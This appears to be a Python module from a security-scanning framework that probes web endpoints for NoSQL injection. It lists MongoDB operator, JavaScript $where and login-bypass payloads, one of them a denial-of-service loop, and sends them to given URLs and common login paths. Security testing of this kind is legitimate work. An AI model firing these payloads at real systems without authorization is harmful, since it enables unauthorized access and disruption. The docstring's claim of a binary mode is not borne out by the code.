"""NoSQLMap — NoSQL injection vulnerability scanner.

NoSQLMap detects and exploits NoSQL injection vulnerabilities in applications
using MongoDB, CouchDB, Redis, and other NoSQL databases.

Two-mode operation:
1. **nosqlmap binary** — if on PATH, invoked for full NoSQL injection testing
2. **Manual fallback** — sends operator injection, JavaScript injection probes
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import shutil
from typing import Any
from urllib.parse import urlparse, parse_qs

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# MongoDB operator injection payloads
_MONGO_OPERATOR_PAYLOADS: list[tuple[str, str]] = [
    # (payload_value, description)
    ('{"$gt": ""}', "mongodb_gt_operator"),
    ('{"$ne": "invalid_value_xyz"}', "mongodb_ne_operator"),
    ('{"$regex": ".*"}', "mongodb_regex_operator"),
    ('{"$where": "1==1"}', "mongodb_where_operator"),
    ('{"$exists": true}', "mongodb_exists_operator"),
    ("[$ne]=invalid_xyz", "nosql_array_ne"),
    ("[$gt]=", "nosql_array_gt"),
    ("[$regex]=.*", "nosql_array_regex"),
]

# Authentication bypass payloads for NoSQL
_AUTH_BYPASS_PAYLOADS: list[tuple[str, str, str]] = [
    # (username_payload, password_payload, description)
    ('{"$ne": null}', '{"$ne": null}', "null_ne_bypass"),
    ('{"$ne": ""}', '{"$ne": ""}', "empty_ne_bypass"),
    ('{"$gt": ""}', '{"$gt": ""}', "gt_bypass"),
    ("admin", '{"$gt": ""}', "password_gt_bypass"),
    ("admin", '{"$ne": "wrong"}', "password_ne_bypass"),
    ("admin' || '1'=='1", "admin", "js_injection_bypass"),
    ('"; return true; var x="', "anything", "js_return_true"),
]

# JavaScript injection for MongoDB $where
_JS_INJECTION_PAYLOADS: list[str] = [
    "' || 1==1 //",
    "'; return true; //",
    "\\x22 || 1==1 //",
    "1; return true",
    "'; while(1) {}//",  # DoS indicator - don't actually use in scanning
]

# Common params for NoSQL injection
_NOSQL_PARAMS: list[str] = [
    "username", "user", "login", "email",
    "password", "pass", "pwd",
    "id", "user_id", "uid",
    "query", "search", "q", "filter",
    "name", "title",
]


class NoSQLMapScanner(BaseOsintScanner):
    """NoSQL injection vulnerability scanner.

    Tests for MongoDB operator injection, JavaScript injection ($where),
    and authentication bypass attacks against NoSQL-backed endpoints.
    Identifies JSON API endpoints and tests them with operator injection.
    """

    scanner_name = "nosqlmap"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 1800
    scan_timeout = 90

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []
        json_endpoints: list[str] = []

        parsed = urlparse(base_url)
        existing_params = list(parse_qs(parsed.query).keys())
        base_clean = base_url.split("?")[0]
        test_params = list(dict.fromkeys(existing_params + _NOSQL_PARAMS[:8]))

        async with httpx.AsyncClient(
            timeout=10,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; NoSQLScanner/1.0)"},
        ) as client:
            # Baseline request to understand normal response
            try:
                baseline = await client.get(base_url)
                baseline_body = baseline.text
                baseline_len = len(baseline.content)
                baseline_status = baseline.status_code
                is_json_api = "application/json" in baseline.headers.get("content-type", "")
                if is_json_api:
                    json_endpoints.append(base_url)
            except Exception:
                baseline_len, baseline_status, is_json_api = 0, 0, False

            semaphore = asyncio.Semaphore(6)

            # Test 1: GET parameter operator injection
            async def test_get_operator(param: str, payload: str, desc: str) -> None:
                async with semaphore:
                    try:
                        url = f"{base_clean}?{param}={payload}"
                        resp = await client.get(url)
                        content_len = len(resp.content)

                        # Success indicators: status 200, larger response (more data returned)
                        # or previously failing auth now succeeds
                        if resp.status_code == 200 and baseline_status in (401, 403, 404):
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "technique": desc,
                                "method": "GET",
                                "severity": "critical",
                                "evidence": f"Auth bypass: {baseline_status} → 200",
                            })
                            ident = f"vuln:nosqli:{param}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                        elif content_len > baseline_len + 100 and resp.status_code == 200:
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload,
                                "technique": desc,
                                "method": "GET",
                                "severity": "high",
                                "evidence": f"Larger response with operator: {content_len} vs {baseline_len}",
                            })
                            ident = f"vuln:nosqli:{param}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # Test 2: JSON body operator injection
            async def test_json_operator(param: str, payload_str: str, desc: str) -> None:
                async with semaphore:
                    try:
                        payload_val = json.loads(payload_str)
                    except json.JSONDecodeError:
                        payload_val = payload_str

                    body = {param: payload_val}
                    try:
                        resp = await client.post(
                            base_clean,
                            json=body,
                            headers={"Content-Type": "application/json"},
                        )
                        if resp.status_code == 200 and baseline_status in (401, 403, 422):
                            vulnerabilities.append({
                                "parameter": param,
                                "payload": payload_str,
                                "technique": f"json_{desc}",
                                "method": "POST_JSON",
                                "severity": "critical",
                                "evidence": f"JSON operator bypass: {baseline_status} → 200",
                            })
                            ident = f"vuln:nosqli_json:{param}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # Test 3: Auth bypass on login endpoints
            async def test_auth_bypass(login_url: str) -> None:
                async with semaphore:
                    for user_payload, pass_payload, desc in _AUTH_BYPASS_PAYLOADS:
                        try:
                            # JSON body
                            resp = await client.post(
                                login_url,
                                json={"username": user_payload, "password": pass_payload},
                                headers={"Content-Type": "application/json"},
                            )
                            if resp.status_code in (200, 302) and re.search(
                                r"(?i)(token|session|dashboard|welcome|success)", resp.text
                            ):
                                vulnerabilities.append({
                                    "url": login_url,
                                    "username": user_payload,
                                    "password": pass_payload,
                                    "technique": f"auth_bypass_{desc}",
                                    "method": "POST_JSON",
                                    "severity": "critical",
                                    "evidence": f"Login succeeded with NoSQL operator payload",
                                })
                                ident = "vuln:nosqli:auth_bypass"
                                if ident not in identifiers:
                                    identifiers.append(ident)
                                break
                        except Exception:
                            pass

            # Build and run tasks
            tasks = []
            for param in test_params:
                for payload, desc in _MONGO_OPERATOR_PAYLOADS[:5]:
                    tasks.append(test_get_operator(param, payload, desc))
                    tasks.append(test_json_operator(param, payload.replace("[$", "{\"$").replace("]=", "\":\"") if payload.startswith("[") else payload, desc))

            await asyncio.gather(*tasks)

            # Test auth bypass on common login paths
            login_paths = ["/api/login", "/api/auth", "/auth/login", "/login", "/signin"]
            auth_tasks = [test_auth_bypass(base_url.rstrip("/") + p) for p in login_paths]
            await asyncio.gather(*auth_tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "json_endpoints_detected": json_endpoints,
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
